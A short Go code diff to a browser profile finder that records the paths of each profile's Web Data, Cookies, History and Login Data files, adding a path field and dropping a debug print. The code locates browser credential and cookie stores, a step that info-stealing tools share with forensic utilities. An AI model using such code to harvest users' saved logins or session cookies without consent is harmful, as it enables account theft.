@@ -49,12 +49,13 @@ func (f *Finder) findBrowsers() []structs.Browser {
 							for _, profileName := range profileNames {
 								profile := structs.Profiles{}
 								if strings.HasPrefix(d.Name(), profileName) {
+
+									profile.NameAndPath = path
+
 									profile.WebData = filepath.Join(path, "Web Data")
 									profile.Cookies = filepath.Join(path, "Network", "Cookies")
 									profile.History = filepath.Join(path, "History")
 									profile.LoginData = filepath.Join(path, "Login Data")
-
-									//fmt.Println(profile)
 
 									profiles = append(profiles, profile)
 									return nil
